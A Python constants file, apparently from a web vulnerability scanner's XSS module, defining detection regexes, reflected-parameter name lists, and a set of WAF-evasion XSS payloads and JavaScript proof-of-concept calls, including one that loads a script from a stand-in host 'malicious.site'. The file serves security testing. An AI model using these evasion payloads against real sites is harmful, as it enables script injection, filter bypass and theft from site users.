"""Shared XSS constants used by active analysis modules.

This file centralizes large constant definitions so the analysis logic
modules can remain focused on algorithms and be smaller and easier to
navigate.
"""

import re

# Probe markers
XSS_PROBE_PREFIX = "xssprobe"
XSS_PROBE_SUFFIX = "123"

# Dangerous value patterns that indicate potential XSS vectors
XSS_DANGEROUS_VALUE_RE = re.compile(
    r"<script\b|javascript:|on\w+\s*=|<svg\b|<img\b|<iframe\b",
    re.IGNORECASE,
)

# Field-level XSS patterns in form attributes
XSS_FIELD_RE = re.compile(
    r'"(?P<field>[a-z0-9_.-]{1,64})"\s*:\s*"(?P<value>(?:\\.|[^"\\])*(?:<script\b|javascript:|on\w+\s*=|<svg\b|<img\b|<iframe\b)(?:\\.|[^"\\])*)"',
    re.IGNORECASE,
)

# Parameter names likely to reflect input
XSS_REFLECTION_CANDIDATE_NAMES = {
    "q",
    "query",
    "search",
    "s",
    "keyword",
    "kw",
    "term",
    "text",
    "name",
    "title",
    "description",
    "desc",
    "comment",
    "message",
    "input",
    "field",
    "value",
    "data",
    "content",
    "body",
    "redirect",
    "url",
    "uri",
    "dest",
    "destination",
    "next",
    "return",
    "callback",
    "jsonp",
    "callback_url",
    "redirect_url",
    "return_url",
    "continue",
    "target",
    "page",
    "view",
    "tab",
    "section",
    "filter",
    "sort",
    "order",
    "category",
    "tag",
    "label",
}

# Parameter names to skip (auth, session, tracking)
XSS_SKIP_PARAM_NAMES = {
    "token",
    "session",
    "jwt",
    "auth",
    "api_key",
    "access_token",
    "refresh_token",
    "client_id",
    "client_secret",
    "authorization",
    "bearer",
    "cookie",
    "sid",
    "phpsessid",
    "csrf",
    "xsrf",
    "signature",
    "sign",
    "hmac",
    "hash",
    "nonce",
    "utm_source",
    "utm_medium",
    "utm_campaign",
    "utm_term",
    "utm_content",
    "fbclid",
    "gclid",
    "_ga",
    "_gl",
}

# Non-executable HTML contexts where injected payloads cannot execute
NON_EXECUTABLE_TAGS = frozenset(
    {
        "iframe",
        "title",
        "textarea",
        "noembed",
        "style",
        "template",
        "noscript",
    }
)

# JavaScript fillers for breaking out of JS context
JS_FILLINGS = (";",)

# Line/whitespace alternatives for bypassing space-based filters
LINE_FILLINGS = ("", "%0dx")

# Event handler fillers - alternative whitespace characters
HANDLER_FILLINGS = ("%09", "%0a", "%0d", "+")

# Space replacements for WAF evasion
SPACE_ALTERNATIVES = ("%09", "%0a", "%0d", "/+/")

# WAF evasion payloads (fallback patterns)
WAF_EVASION_PATTERNS = (
    "<details%09ontoggle=confirm()>",
    "<svg%0Aonload=%09confirm()>",
    "<d3v%0donpointerenter=confirm()>",
    "<deTails open oNToggle=confi\\u0072m()>",
    "<sCript x>confirm``</scRipt x>",
    "<d3v/onpointerenter=confirm()>",
    "<a/href=javascript%3Aconfirm()>",
    "<iframe src=%22javascript:confirm(1)%22>",
    "<a href=javascript&#58;confirm(1)>click</a>",
    "<img/src/onerror=confirm(1)>",
    "<base href=//malicious.site/><script src=/>",
    "<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",
)

# Event handlers and compatible tags
EVENT_HANDLERS = {
    "ontoggle": ["details"],
    "onpointerenter": ["d3v", "details", "html", "a"],
    "onmouseover": ["a", "html", "d3v"],
}

# Tags that can be used as injection vehicles
INJECTION_TAGS = ("html", "d3v", "a", "details")

# JavaScript functions for proof-of-concept
JS_FUNCTIONS = (
    "[8].find(confirm)",
    "confirm()",
    "(confirm)()",
    "co\\u006efir\\u006d()",
    "(prompt)``",
    "a=prompt,a()",
)

# Backwards-compatible aliases used in xss_context_engine
_SPACE_ALT = SPACE_ALTERNATIVES
_INJECTION_TAGS = INJECTION_TAGS
_EVENT_HANDLERS = EVENT_HANDLERS
_JS_FUNCTIONS = JS_FUNCTIONS

__all__ = [
    "XSS_PROBE_PREFIX",
    "XSS_PROBE_SUFFIX",
    "XSS_DANGEROUS_VALUE_RE",
    "XSS_FIELD_RE",
    "XSS_REFLECTION_CANDIDATE_NAMES",
    "XSS_SKIP_PARAM_NAMES",
    "NON_EXECUTABLE_TAGS",
    "JS_FILLINGS",
    "LINE_FILLINGS",
    "HANDLER_FILLINGS",
    "SPACE_ALTERNATIVES",
    "WAF_EVASION_PATTERNS",
    "EVENT_HANDLERS",
    "INJECTION_TAGS",
    "JS_FUNCTIONS",
    "_SPACE_ALT",
    "_INJECTION_TAGS",
    "_EVENT_HANDLERS",
    "_JS_FUNCTIONS",
]
